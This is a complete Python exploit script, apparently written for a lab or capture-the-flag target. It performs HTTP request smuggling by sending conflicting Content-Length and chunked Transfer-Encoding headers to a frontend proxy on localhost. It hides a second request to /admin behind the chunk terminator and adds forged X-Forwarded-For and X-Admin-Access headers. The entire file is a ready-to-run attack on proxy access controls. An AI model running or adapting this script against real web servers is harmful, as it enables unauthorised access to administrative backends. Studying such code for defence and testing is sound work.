import os
import socket
import time

print('Running:', __file__)
print('CWD:', os.getcwd())

def send_request():
    # The smuggled request to /admin
    smuggled = (
        b"GET /admin HTTP/1.1\r\n"
        b"Host: backend\r\n"
        b"X-Forwarded-For: 172.18.0.3\r\n"
        b"X-Admin-Access: true\r\n"
        b"\r\n"
    )

    # The chunked body: just the chunk terminator, then the smuggled request
    chunked_terminator = b"0\r\n\r\n"
    body = chunked_terminator + smuggled

    # The main request
    request = (
        b"POST / HTTP/1.1\r\n"
        b"Host: frontend\r\n"
        b"Content-Length: " + str(len(chunked_terminator)).encode() + b"\r\n"
        b"Transfer-Encoding: chunked\r\n"
        b"Connection: close\r\n"
        b"\r\n"
        + body
    )

    print('Connecting to frontend proxy on port 80')
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('localhost', 80))
    s.sendall(request)

    response = b""
    while True:
        part = s.recv(4096)
        if not part:
            break
        response += part
    s.close()

    # Print the full response(s)
    print(response.decode(errors='replace'))

if __name__ == "__main__":
    send_request() 